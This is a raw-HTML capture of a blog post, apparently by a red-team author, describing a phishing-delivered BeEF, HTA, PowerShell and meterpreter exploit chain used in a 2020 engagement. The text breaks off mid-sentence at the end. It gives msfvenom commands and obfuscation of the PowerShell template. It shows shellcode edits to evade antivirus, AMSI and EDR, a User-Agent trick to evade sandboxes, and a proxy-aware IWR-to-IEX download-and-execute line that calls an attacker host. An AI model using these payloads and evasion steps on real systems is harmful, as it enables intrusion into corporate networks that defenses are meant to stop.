href="https://medium.com/m/signin?actionUrl=%2F_%2Fbookmark%2Fp%2F96b0eb61f1b6&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40bluedenkare%2F1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6&amp;source=post_actions_header--------------------------bookmark_preview-----------" class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" rel="noopener"><svg width="25" height="25" viewBox="0 0 25 25"><path d="M19 6a2 2 0 0 0-2-2H8a2 2 0 0 0-2 2v14.66h.01c.01.1.05.2.12.28a.5.5 0 0 0 .7.03l5.67-4.12 5.66 4.13a.5.5 0 0 0 .71-.03.5.5 0 0 0 .12-.29H19V6zm-6.84 9.97L7 19.64V6a1 1 0 0 1 1-1h9a1 1 0 0 1 1 1v13.64l-5.16-3.67a.49.49 0 0 0-.68 0z" fill-rule="evenodd"></path></svg></a></span></div></div><div class="fv w an"></div></div></div></div></div></div><p id="3914" class="fw fx ef fy b fz ga gb gc gd ge gf gg gh gi gj gk gl gm gn go gp cz de">The goal of this article is to demonstrate a working exploit chain step-by-step. The idea is to prov<span id="rmm">i</span>de a small guide for multi staged payload delivery including bypass of common defenses found in corporate networks to obtain RCE. Anti-virus bypass is not the focus of this article, as it should not be the focus of any penetration test, however techniques to perform quick bypass for virtually any AVs on the market will be showcased. More generally, any constraints lying before the attacker on its way to meterpreter, such as proxies, sandboxes, AMSI, etc., will be discussed and we will show solutions to each of those problems.</p><p id="ef41" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">This article will take as example a payload delivery done for a red team engagement in 2020. For this engagement, a raw bash script was developed to automate each step of payload generation. Some parts will be showcased later and you can find a link to the script in reference.</p></div></div></section><div class="n p fb gv gw gx" role="separator"><span class="gy ff bk gz ha hb"></span><span class="gy ff bk gz ha hb"></span><span class="gy ff bk gz ha"></span></div><section class="cz ea eb cu ec"><div class="n p"><div class="ae af ag ah ai ed ak t"><h1 id="b652" class="hc hd ef ap he hf hg ga hh hi hj gd hk hl hm hn ho hp hq hr hs ht hu hv hw hx de">Payload delivery scenario</h1><p id="4df8" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">The idea was to perform delivery using phishing via link that would redirect user to download and execute our malicious payload.<br/>There were multiple constraints to successfully obtaining RCE. First, their workstations could run either Windows or MacOS, so we had to get ready to generate two different payloads and deliver accordingly.<br/>Then, they have a proxy. Hopefully, we knew that their proxy is transparent, so it would not be that hard. Finally, they also have a sandbox that checks links and attachments in emails.<br/>We will focus on Windows scenario, since it is the most interesting case with some constraints. <br/>We opted for three-staged payload with HTA to PowerShell dropper to meterpreter. PowerShell is still one of the most reliable ways to inject code in memory on Windows nowadays, even with the presence of AMSI (we will show later how AMSI has been circumvented).</p><h1 id="6b65" class="hc hd ef ap he hf id ga hh hi ie gd hk hl if hn ho hp ig hr hs ht ih hv hw hx de">Showcasing the exploit chain: HTA + PowerShell dropper + Meterpreter</h1><p id="6c4b" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">We decided to prepare an HTA file that would execute our PowerShell dropper on the victim’s Windows machine. A lot of companies still use Internet Explorer or Edge as their default browser, so it is not rare that HTA-based scenario works. <br/>So, we would have an exploit chain looking like this:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds ii"><div class="iw w ab ix"><div class="iy iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/56/1*aOmoaGSOix6EwdG0zKIIwg.png?q=20" width="482" height="512"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="482" height="512"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/964/1*aOmoaGSOix6EwdG0zKIIwg.png" width="482" height="512" srcSet="https://miro.medium.com/max/552/1*aOmoaGSOix6EwdG0zKIIwg.png 276w, https://miro.medium.com/max/964/1*aOmoaGSOix6EwdG0zKIIwg.png 482w" sizes="482px"/></noscript></div></div></div><figcaption class="jd je dt dr ds jf jg ap b aq ar bo">3 stages exploit chain</figcaption></figure><p id="888f" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">For meterpreter, we used reverse HTTPS payload since they have proxy.<br/>One question we asked ourselves is: “should we use staged or stageless meterpreter?” Technically, with staged meterpreter, exploit chain would result in 4 stages delivery. The issue to consider here is detection. By loading external pieces of code in memory, we can easily get catched by EDR. That is why stageless should be the preferable option.</p><h1 id="bf2b" class="hc hd ef ap he hf id ga hh hi ie gd hk hl if hn ho hp ig hr hs ht ih hv hw hx de">Configuring BeEF and reverse proxy</h1><p id="cb08" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">The next question on our mind was: “how to deliver HTA?” For our engagements, we like to use BeEF. One good point of BeEF is that, even in case of payload delivery failure, the browser is still hooked, and it is possible to try other techniques. Also, BeeF already has a module that performs HTA delivery, named “HTA PowerShell”. HTA from BeEF uses PowerShell dropper to inject MSF reverse HTTPS payload. However, we would not use the one from BeEF because it is probably flagged, so we have to use a customized HTA and tell BeEF to deliver it instead.</p><p id="730a" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">This is possible by setting the options of the HTA PowerShell module. However, we discovered some strange behavior with BeEF that would just not grab our payload served by Apache or any other HTTP server with default config. The issue was a hard-coded path inside BeEF source, so we had to remove it. For example, if we served a file named “hta.hta”, it would not work due to lack of extension, except if we would perform URI redirection.</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds jh"><div class="iw w ab ix"><div class="ji iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*caaKvyFWcMkbxh2tbRu3DA.png?q=20" width="624" height="134"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="624" height="134"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1248/1*caaKvyFWcMkbxh2tbRu3DA.png" width="624" height="134" srcSet="https://miro.medium.com/max/552/1*caaKvyFWcMkbxh2tbRu3DA.png 276w, https://miro.medium.com/max/1104/1*caaKvyFWcMkbxh2tbRu3DA.png 552w, https://miro.medium.com/max/1248/1*caaKvyFWcMkbxh2tbRu3DA.png 624w" sizes="624px"/></noscript></div></div></div><figcaption class="jd je dt dr ds jf jg ap b aq ar bo">Modification to perform in command.js</figcaption></figure><p id="3f2e" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">And then our test HTA file could be successfully grabbed by BeEF and delivered.<br/>We configured our reverse proxy to deliver payload based on User-Agent to fool sandbox. It is useful to prevent sandbox from grabbing the payload, because we will only serve payloads to legitimate User-Agents. So, if the sandbox uses non-Windows User-Agent, it will see nothing except a simple HTML page. That is not foolproof, but a well-known trick to evade sandbox detection. Since, there were multiple OS at the targeted company, it was also used to deliver the correct payload for each OS.<br/>Let us enter the core subject by explaining how we manage to perform payload customization in order to have working and undetectable payloads.</p><h1 id="a8bc" class="hc hd ef ap he hf id ga hh hi ie gd hk hl if hn ho hp ig hr hs ht ih hv hw hx de">Modifying MSF PowerShell template</h1><p id="d88b" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">First, we will focus on our PowerShell stage that will be called inside the HTA file. <br/>We started from basic MSF psh-net payload:</p><p id="bbd9" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de"><code class="ix jj jk jl jm b">msfvenom -p windows/x64/meterpreter_reverse_https LHOST=&lt;LHOST&gt; LPORT=443 -f psh-net -o msf_payload.ps1</code></p><p id="bf83" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Just for fun, we tried to upload this payload without the shellcode (replacing base64 shellcode by encoded “hello”), and here is the detection we got:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds jn"><div class="iw w ab ix"><div class="jo iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*IGSRHSxerw3A1RZ0cRkzrg.png?q=20" width="665" height="351"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="665" height="351"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1330/1*IGSRHSxerw3A1RZ0cRkzrg.png" width="665" height="351" srcSet="https://miro.medium.com/max/552/1*IGSRHSxerw3A1RZ0cRkzrg.png 276w, https://miro.medium.com/max/1104/1*IGSRHSxerw3A1RZ0cRkzrg.png 552w, https://miro.medium.com/max/1280/1*IGSRHSxerw3A1RZ0cRkzrg.png 640w, https://miro.medium.com/max/1330/1*IGSRHSxerw3A1RZ0cRkzrg.png 665w" sizes="665px"/></noscript></div></div></div></figure><p id="4c11" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">This shows that most of the detection comes from the PowerShell template and not from the shellcode itself. So, the goal is to modify the PS file enough that signatures will not match in order to avoid static detection. There are quite a few “techniques” for that:</p><ul class=""><li id="153d" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp jp jq jr de">Splitting strings in several parts and creating intermediate variables;</li><li id="701a" class="fw fx ef fy b fz js ga gb gc jt gd ge gf ju gg gh gi jv gj gk gl jw gm gn gp jp jq jr de">Adding loads of junk comments;</li><li id="3cfb" class="fw fx ef fy b fz js ga gb gc jt gd ge gf ju gg gh gi jv gj gk gl jw gm gn gp jp jq jr de">Adding some junk instructions, such as loop or sleep instructions (useful for sandboxes).</li></ul><p id="b6d7" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">This approach can be automated quite easily.</p><p id="00aa" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Below are simple examples of how we can obfuscate parts of PS file:</p><blockquote class="jx jy jz"><p id="6e1f" class="fw fx ka fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">[DllImport(“kernel32.dll”)]</p></blockquote><p id="a57d" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">to</p><blockquote class="jx jy jz"><p id="f8c4" class="fw fx ka fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">[DllImport(“ke”+”rne”+”l32.dll”)]</p><p id="4395" class="fw fx ka fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">$przdE.ReferencedAssemblies.AddRange(@(“System.dll”, [PsObject].Assembly.Location))</p></blockquote><p id="db15" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">to</p><blockquote class="jx jy jz"><p id="1e87" class="fw fx ka fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">$magic = “Syst”+”em”+”.dll”; $lnNJd.ReferencedAssemblies.AddRange(@($magic, [PsObject].Assembly.Location))</p></blockquote><p id="bf6a" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Splitting the shellcode will prevent any part of the signature from matching (we will also see later how to modify the shellcode):</p><blockquote class="jx jy jz"><p id="354c" class="fw fx ka fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">$sc0=&lt;Part 1 of shellcode&gt; ; … $sc7=&lt;Part 8 of shellcode&gt;; [Byte[]]$tcomplete_sc = [System.Convert]::FromBase64String($sc0+$sc1+…+$sc7)</p></blockquote><p id="9a20" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">For staged payload, only around 7 chunks is sufficient, however, since stageless shellcode is much bigger, it can be interesting to automate this step, as we will show at the end of the article. Splitting stageless shellcodes into chunks of 1337 characters gave more than 201 chunks, so performing it manually can be quite tedious.</p><p id="e473" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">When submitting our modified payload with default MSF shellcode to VirusTotal, here is the result:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds kb"><div class="iw w ab ix"><div class="kc iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*9kRSNg0IsaFXByGL9-DMeg.png?q=20" width="634" height="406"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="634" height="406"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1268/1*9kRSNg0IsaFXByGL9-DMeg.png" width="634" height="406" srcSet="https://miro.medium.com/max/552/1*9kRSNg0IsaFXByGL9-DMeg.png 276w, https://miro.medium.com/max/1104/1*9kRSNg0IsaFXByGL9-DMeg.png 552w, https://miro.medium.com/max/1268/1*9kRSNg0IsaFXByGL9-DMeg.png 634w" sizes="634px"/></noscript></div></div></div></figure><p id="4c17" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">The next part will be about shellcode modification and how to avoid being catched in memory.</p><h1 id="a4f8" class="hc hd ef ap he hf id ga hh hi ie gd hk hl if hn ho hp ig hr hs ht ih hv hw hx de">Tweaking the shellcode</h1><p id="82d2" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">Modifying shellcode is the “trickiest” part of payload customization. Some misplaced changes could break the shellcode, so it is important to do “safe” changes and to test it after. There are several places where you have to look for the signature. In the past, all MSF payloads were encoded with shikata-ga-nai, unless specified otherwise. Encoder is still useful compared to no encoder, because raw meterpreter in memory will easily be catched by EDR and IPS/IDS. So, modifying shellcode signature is the way to go. <br/>Also, if you modify shellcode well enough, you can bypass AMSI. <br/>You do not really need assembly knowledge for this, since some instructions are pretty much self-explanatory such as inc or dec.</p><p id="8079" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">First step to shellcode modification is to extract shellcode and put it in a file. Here, we will take default MSF staged reverse HTTPS payload for demo.</p><p id="4fd6" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Extract base64-encoded payload string:</p><p id="a9a3" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de"><code class="ix jj jk jl jm b">cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o &quot;.*&quot; | sed &#x27;s/&quot;//g&#x27; &gt; raw_pshnet_revhttps.base64.txt</code></p><p id="9c09" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Transform in hex string:</p><p id="33d6" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de"><code class="ix jj jk jl jm b">base64 -d raw_pshnet_revhttps.base64.txt | xxd -p | tr -d &#x27;\n&#x27; &gt; raw_pshnet_revhttps.hex.txt</code></p><p id="5592" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Next, paste your hexadecimal string into disassembler. We will use online disassembler <a href="https://defuse.ca/online-x86-assembler.htm" class="dh kd" rel="noopener nofollow">https://defuse.ca/online-x86-assembler.htm</a> for demo purpose. Do not forget to put the correct architecture. Here we have a x64 payload. Note that since some changes to PowerShell, you cannot make 32b shellcode work with 64b PowerShell process, you must use x64 shellcode.</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds jh"><div class="iw w ab ix"><div class="ke iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*D-QNiDSoAuHf_38WcmooPQ.png?q=20" width="624" height="314"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="624" height="314"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1248/1*D-QNiDSoAuHf_38WcmooPQ.png" width="624" height="314" srcSet="https://miro.medium.com/max/552/1*D-QNiDSoAuHf_38WcmooPQ.png 276w, https://miro.medium.com/max/1104/1*D-QNiDSoAuHf_38WcmooPQ.png 552w, https://miro.medium.com/max/1248/1*D-QNiDSoAuHf_38WcmooPQ.png 624w" sizes="624px"/></noscript></div></div></div></figure><p id="2444" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">You see the first disassembled instructions:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds kf"><div class="iw w ab ix"><div class="kg iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/58/1*2knW8_1LnPW3A6b2ucGMAA.png?q=20" width="438" height="457"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="438" height="457"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/876/1*2knW8_1LnPW3A6b2ucGMAA.png" width="438" height="457" srcSet="https://miro.medium.com/max/552/1*2knW8_1LnPW3A6b2ucGMAA.png 276w, https://miro.medium.com/max/876/1*2knW8_1LnPW3A6b2ucGMAA.png 438w" sizes="438px"/></noscript></div></div></div></figure><p id="50eb" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">We want to put junk instructions at the beginning of the assembly code. Be careful, if you put instructions after the call to cld, the shellcode will be broken, since string operations will have impact on index registers (esi and edi).</p><p id="ec62" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">You can add some instructions such as xor, inc, dec, add, sub, mov, nop etc. at the beginning. There are many ways to add instructions, but you could just use assembler on defuse.ca to assemble your instructions and then put it back in shellcode.<br/>Below is an example of instructions we added:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds kh"><div class="iw w ab ix"><div class="ki iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*d0FSro3l_iGs5P4AVpAx3w.png?q=20" width="444" height="374"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="444" height="374"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/888/1*d0FSro3l_iGs5P4AVpAx3w.png" width="444" height="374" srcSet="https://miro.medium.com/max/552/1*d0FSro3l_iGs5P4AVpAx3w.png 276w, https://miro.medium.com/max/888/1*d0FSro3l_iGs5P4AVpAx3w.png 444w" sizes="444px"/></noscript></div></div></div></figure><p id="efa6" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Do not add too much nop in succession, because it could be flagged as suspicious. Here we modified the rax register because it is not used at the beginning.<br/>Of course, the same operation can be done at different places in the shellcode.<br/>Once you have your shellcode ready, you can paste it in a file and convert it to base64.</p><p id="4b82" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de"><code class="ix jj jk jl jm b">xxd -p -r final_pshnet_revhttps.hex.txt | base64 | tr -d &#x27;\n&#x27; &gt; final_pshnet_revhttps.base64.txt</code></p><p id="965f" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Finally, you can put it back into the PS file.</p><h1 id="1732" class="hc hd ef ap he hf id ga hh hi ie gd hk hl if hn ho hp ig hr hs ht ih hv hw hx de">Preparing HTA file</h1><p id="8cbb" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">So now that we have shellcode and PowerShell template ready, we need to prepare the HTA file that will execute our dropper.<br/>MSF can generate an HTA file with the following command:</p><p id="7f07" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de"><code class="ix jj jk jl jm b">msfvenom -p windows/x64/meterpreter_reverse_https LHOST=X.X.X.X LPORT=443 -f hta-psh -o msf_hta.hta</code></p><p id="d66c" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Here the payload is stageless reverse HTTPS, but we do not care about generated payload since we will use HTA to call our own PowerShell payload. It will generate a file with embedded VBScript that will call PowerShell with an encoded command, which performs loading of shellcode in memory.</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds jh"><div class="iw w ab ix"><div class="kj iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*88OwIEd22DOn7aOrOIbBrw.png?q=20" width="624" height="264"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="624" height="264"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1248/1*88OwIEd22DOn7aOrOIbBrw.png" width="624" height="264" srcSet="https://miro.medium.com/max/552/1*88OwIEd22DOn7aOrOIbBrw.png 276w, https://miro.medium.com/max/1104/1*88OwIEd22DOn7aOrOIbBrw.png 552w, https://miro.medium.com/max/1248/1*88OwIEd22DOn7aOrOIbBrw.png 624w" sizes="624px"/></noscript></div></div></div></figure><p id="03a3" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">We will decode the original payload and adapt it to execute our own PowerShell payload. Put it in a file and we are going to decode it:</p><p id="6ef3" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de"><code class="ix jj jk jl jm b">cat base64_hta_payload.txt | base64 -d &gt; decoded_hta_payload.txt</code></p><p id="e03d" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Result should look like this:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds jh"><div class="iw w ab ix"><div class="kk iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*RNG83UHMdhHWIpum0K32pQ.png?q=20" width="624" height="389"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="624" height="389"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1248/1*RNG83UHMdhHWIpum0K32pQ.png" width="624" height="389" srcSet="https://miro.medium.com/max/552/1*RNG83UHMdhHWIpum0K32pQ.png 276w, https://miro.medium.com/max/1104/1*RNG83UHMdhHWIpum0K32pQ.png 552w, https://miro.medium.com/max/1248/1*RNG83UHMdhHWIpum0K32pQ.png 624w" sizes="624px"/></noscript></div></div></div></figure><p id="4f70" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">What we want to do here is remove the loading of the base64 shellcode and instead perform a web request to execute our PowerShell stage 2 payload that is hosted on our web server.<br/>We also have to take into account proxy before doing the request.</p><p id="de1f" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">In PowerShell, this would give something like this:</p><blockquote class="jx jy jz"><p id="0042" class="fw fx ka fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR <a href="http://X.X.X.X/stage2.ps1" class="dh kd" rel="noopener nofollow">http://X.X.X.X/stage2.ps1</a> -UserAgent ‘Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko’|IEX</p></blockquote><p id="bf89" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Here we set the User-Agent so that our web server would serve the correct payload (matching on “Windows” User-Agent).<br/>Then you need to convert your modified dropper in base64 UTF-16LE and put it back in HTA file:</p><p id="8234" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de"><code class="ix jj jk jl jm b">cat decoded_hta_payload.txt | iconv -f ascii -t utf-16le | base64 | tr -d &#x27;\n&#x27; &gt; hta_payload.base64.txt</code></p><p id="06a0" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">The result looks like this:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds jh"><div class="iw w ab ix"><div class="kl iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*pxCoeAUjskIjwOT8d20cdA.png?q=20" width="624" height="111"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="624" height="111"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1248/1*pxCoeAUjskIjwOT8d20cdA.png" width="624" height="111" srcSet="https://miro.medium.com/max/552/1*pxCoeAUjskIjwOT8d20cdA.png 276w, https://miro.medium.com/max/1104/1*pxCoeAUjskIjwOT8d20cdA.png 552w, https://miro.medium.com/max/1248/1*pxCoeAUjskIjwOT8d20cdA.png 624w" sizes="624px"/></noscript></div></div></div></figure><p id="5cfa" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Finally, we have our exploit chain ready.</p><h1 id="278b" class="hc hd ef ap he hf id ga hh hi ie gd hk hl if hn ho hp ig hr hs ht ih hv hw hx de">Launching the attack</h1><p id="997a" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">Time to test! The victim is a Windows 10 Pro version 1909 (OS Build 18363.600) with all protections enabled.</p><p id="be43" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">We simulate browser hooking with BeEF by browsing to a page containing BeEF hook script. In real life, this can be done through XSS exploitation, phishing campaign… Our Internet Explorer browser is hooked:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds km"><div class="iw w ab ix"><div class="kn iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*O2sXEUnHTrdyvRWUDAp9yw.png?q=20" width="640" height="278"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="640" height="278"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1280/1*O2sXEUnHTrdyvRWUDAp9yw.png" width="640" height="278" srcSet="https://miro.medium.com/max/552/1*O2sXEUnHTrdyvRWUDAp9yw.png 276w, https://miro.medium.com/max/1104/1*O2sXEUnHTrdyvRWUDAp9yw.png 552w, https://miro.medium.com/max/1280/1*O2sXEUnHTrdyvRWUDAp9yw.png 640w" sizes="640px"/></noscript></div></div></div></figure><p id="92a2" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">From here, we can go to the HTA PowerShell module and launch it. We rewrite the serving domain and HTA handler to serve our custom payload:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds jh"><div class="iw w ab ix"><div class="ko iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*8AN3L94KVm9TQMfhQzCGKg.png?q=20" width="624" height="258"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="624" height="258"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1248/1*8AN3L94KVm9TQMfhQzCGKg.png" width="624" height="258" srcSet="https://miro.medium.com/max/552/1*8AN3L94KVm9TQMfhQzCGKg.png 276w, https://miro.medium.com/max/1104/1*8AN3L94KVm9TQMfhQzCGKg.png 552w, https://miro.medium.com/max/1248/1*8AN3L94KVm9TQMfhQzCGKg.png 624w" sizes="624px"/></noscript></div></div></div></figure><p id="35b5" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">HTA is delivered to our victim:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds km"><div class="iw w ab ix"><div class="kp iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*auQi-RP3-YApCEhgBoNnqA.png?q=20" width="640" height="334"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="640" height="334"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1280/1*auQi-RP3-YApCEhgBoNnqA.png" width="640" height="334" srcSet="https://miro.medium.com/max/552/1*auQi-RP3-YApCEhgBoNnqA.png 276w, https://miro.medium.com/max/1104/1*auQi-RP3-YApCEhgBoNnqA.png 552w, https://miro.medium.com/max/1280/1*auQi-RP3-YApCEhgBoNnqA.png 640w" sizes="640px"/></noscript></div></div></div></figure><p id="a094" class="fw fx ef fy b fz gq ga gb gc gr gd ge gf gs gg gh gi gt gj gk gl gu gm gn gp cz de">Once the victim clicks on open, it will download PowerShell 